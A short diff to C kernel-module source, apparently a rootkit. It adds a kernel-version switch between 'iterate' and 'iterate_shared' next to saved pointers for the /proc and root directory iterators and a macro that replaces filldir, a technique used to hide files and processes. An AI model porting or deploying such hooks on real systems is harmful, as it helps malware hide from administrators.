@@ -38,7 +38,11 @@ static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 #else
 static int (*proc_iterate)(struct file *file, struct dir_context *);
 static int (*root_iterate)(struct file *file, struct dir_context *);
-#define ITERATE_NAME iterate
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 6, 0)
+    #define ITERATE_NAME iterate
+    #else
+    #define ITERATE_NAME iterate_shared
+    #endif
 #define ITERATE_PROTO struct file *file, struct dir_context *ctx
 #define FILLDIR_VAR ctx->actor
 #define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
